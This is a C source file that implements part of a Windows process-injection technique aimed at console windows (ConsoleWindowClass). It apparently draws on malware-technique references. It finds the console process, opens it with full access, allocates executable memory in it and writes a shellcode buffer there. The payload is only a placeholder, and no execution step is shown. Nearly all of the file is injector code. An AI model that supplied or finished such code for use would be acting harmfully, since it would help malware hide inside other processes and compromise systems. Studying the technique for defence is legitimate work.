/*FindWindow, GetWindowThreadProcessId, OpenProcess, ReadProcessMemory, VirtualAllocEx, WriteProcessMemory, VirtualFreeEx*/
/*resources: https://unprotect.it/technique/consolewindowclass/ 
https://modexp.wordpress.com/2018/09/12/process-injection-user-data/ */
#include <windows.h>
#include <stdio.h>





//payload
char shellcode[] = {"payload here"};
    SIZE_T shellcodesize = sizeof(shellcode);

int main(void){

    DWORD pid, oldprotect;
    HWND hWindow = 0;
    HANDLE hProcess;
    LPVOID hLongptr, ds, hRemote, ptr;//p, ds, 
    SIZE_T read, written; //readed memory from process

    hWindow = FindWindow("ConsoleWindowClass", 0);
    if(hWindow == NULL){
        printf("[-] unable to retrive handle to ConsoleWindowClass [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] handle to ConsoleWindowClass has been retrive\n");


    hLongptr  = (LPVOID)GetWindowLongPtr(hWindow, 0);//retrieves information about windows 0 pointer, which indicates on structure that stores data about pop up window itself. 

    
    if(GetWindowThreadProcessId(hWindow, &pid) == 0)// retrieves process id basing on the hWindows thread info.
    {
        printf("[-] unable to retriving PID, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] PID has been retrived, is: [%d]\n", pid);


//opening target process associated with hWindow
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if(hProcess == NULL){
        printf("[-] unable to open process, error: [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] process [%d] has been opened\n", pid);
    ReadProcessMemory(hProcess, hLongptr, &ptr, sizeof(ULONG_PTR), &read);

    
// alocating and wrinting data into target process
    hRemote = VirtualAllocEx(hProcess, NULL, shellcodesize, MEM_RESERVE | MEM_COMMIT,  PAGE_EXECUTE_READWRITE);//cs
    if(hRemote == NULL){
        printf("[-] unable to allocate memory to required process, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] memory has been alloacted [%p]\n", hRemote);

    VirtualProtectEx(hProcess, hRemote, shellcodesize, PAGE_EXECUTE_READWRITE, &oldprotect);// to prevent 998 error from WriteProcessMemory
    if(WriteProcessMemory(hProcess, (LPVOID)hRemote, shellcode, shellcodesize, &written) == 0){
        printf("[-] unable to write shellcode, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] shellcode has been written, [%d]\n", written);


    return 0;
}
